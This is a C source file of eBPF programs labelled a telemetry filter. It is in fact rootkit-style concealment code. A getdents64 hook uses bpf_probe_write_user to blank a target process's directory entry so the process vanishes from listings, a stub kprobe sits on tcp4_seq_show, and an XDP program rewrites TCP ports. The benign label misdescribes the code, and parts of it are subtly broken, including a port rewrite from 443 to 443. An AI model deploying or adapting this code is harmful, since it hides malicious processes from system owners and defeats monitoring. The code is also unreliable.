// eBPF process and network telemetry filter
// Filters process listing and network socket visibility

#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

#include <linux/in.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";

struct trace_event_raw_sys_exit {
    unsigned long long pad;
    long id;
    long ret;
    long args[6];
};

unsigned int TARGET_PID = 999999; 
unsigned short TARGET_PORT = 443;

struct linux_dirent64 {
    unsigned long long d_ino;
    long long d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[256];
};

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
    long ret = ctx->ret;
    if (ret <= 0) return 0;

    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
    
    #pragma unroll
    for (int i = 0; i < 20; i++) {
        struct linux_dirent64 dir;
        bpf_probe_read_user(&dir, sizeof(dir), dirp);
        
        char pid_str[10];
        bpf_probe_read_user(&pid_str, sizeof(pid_str), dir.d_name);
        
        unsigned int pid = 0;
        for (int j=0; j<6; j++) {
            if (pid_str[j] >= '0' && pid_str[j] <= '9') {
                pid = pid * 10 + (pid_str[j] - '0');
            } else {
                break;
            }
        }

        if (pid == TARGET_PID) {
            unsigned short reclen = dir.d_reclen;
            struct linux_dirent64 *next_dirp = (struct linux_dirent64 *)((char *)dirp + reclen);
            
            char empty_name[256];
            __builtin_memset(empty_name, 0, sizeof(empty_name));
            bpf_probe_write_user(dirp->d_name, empty_name, sizeof(empty_name));
            unsigned short zero = 0;
            bpf_probe_write_user(&dirp->d_reclen, &zero, sizeof(zero));
            break;
        }
        dirp = (struct linux_dirent64 *)((char *)dirp + dir.d_reclen);
    }
    return 0;
}

SEC("kprobe/tcp4_seq_show")
int BPF_KPROBE(tcp4_seq_show_hook)
{
    return 0;
}

#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>

SEC("xdp")
int xdp_network_filter(struct xdp_md *ctx)
{
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    if (eth->h_proto != __constant_htons(ETH_P_IP))
        return XDP_PASS;

    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;

    if (ip->protocol != 6)
        return XDP_PASS;

    struct tcphdr *tcp = (void *)ip + (ip->ihl * 4);
    if ((void *)(tcp + 1) > data_end)
        return XDP_PASS;

    if (tcp->source == __constant_htons(TARGET_PORT) || tcp->dest == __constant_htons(TARGET_PORT)) {
        __be16 old_port;
        __be16 new_port = __constant_htons(443);
        
        if (tcp->source == __constant_htons(TARGET_PORT)) {
            old_port = tcp->source;
            tcp->source = new_port;
        } else {
            old_port = tcp->dest;
            tcp->dest = new_port;
        }

        unsigned long sum = (~ntohs(tcp->check) & 0xffff) + ntohs(old_port) - ntohs(new_port);
        sum = (sum & 0xffff) + (sum >> 16);
        tcp->check = htons(~sum);
    }

    return XDP_PASS;
}
